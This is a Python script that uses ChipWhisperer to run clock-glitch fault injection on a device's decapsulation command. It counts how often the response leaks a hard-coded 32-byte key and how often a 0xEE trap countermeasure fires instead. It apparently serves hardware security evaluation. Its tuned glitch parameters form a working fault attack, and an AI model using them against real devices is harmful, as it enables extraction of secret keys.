import chipwhisperer as cw, time
K_TARGET = bytes.fromhex("2eec0d2747a234c7f23dbf4838b6d0400bbba6ca4c82e98fd102aaeecc0f646d")
TRAP     = bytes([0xEE]*32)
OFFSET, REPEAT, N = 2199, 1, 100
WIDTH, GOFF = 459, -691

scope = cw.scope(); target = cw.target(scope)
scope.clock.clkgen_freq=7372800; scope.clock.clkgen_src="internal"; scope.clock.adc_mul=4
scope.io.tio1="serial_rx"; scope.io.tio2="serial_tx"; scope.trigger.triggers="tio4"; target.baud=38400
scope.glitch.enabled=True; scope.glitch.clk_src="pll"; scope.glitch.trigger_src="ext_single"
scope.io.hs2="glitch"; scope.glitch.output="clock_xor"

def reset():
    scope.io.nrst='low'; time.sleep(0.05); scope.io.nrst='high_z'; time.sleep(0.2); target.flush()
def recover():
    scope.glitch.output="clock_only"; reset(); scope.glitch.output="clock_xor"
def decap():
    scope.glitch.width=WIDTH; scope.glitch.offset=GOFF
    scope.glitch.ext_offset=OFFSET; scope.glitch.repeat=REPEAT
    target.flush(); scope.arm(); target.simpleserial_write('d', bytearray())
    try: return target.simpleserial_read('r',32,timeout=1000,ack=False)
    except Exception: return None

reset()
target.flush(); target.simpleserial_write('d', bytearray())
baseline = bytes(target.simpleserial_read('r',32,timeout=2000,ack=False) or b'')
print("baseline:", baseline.hex())

c = {"Normal":0,"Trapped":0,"Leak":0,"Crash":0,"Corruption":0}
for i in range(N):
    reset(); res = decap()
    if res is None: s="Crash"
    else:
        res=bytes(res)
        if res==TRAP: s="Trapped"
        elif res==baseline: s="Normal"
        elif res==K_TARGET: s="Leak"
        else: s="Corruption"
    c[s]+=1; recover()
print(c)
print(f"=> Trapped {c['Trapped']}/{N}, Leaked {c['Leak']}/{N} at offset {OFFSET}")
scope.dis(); target.dis()
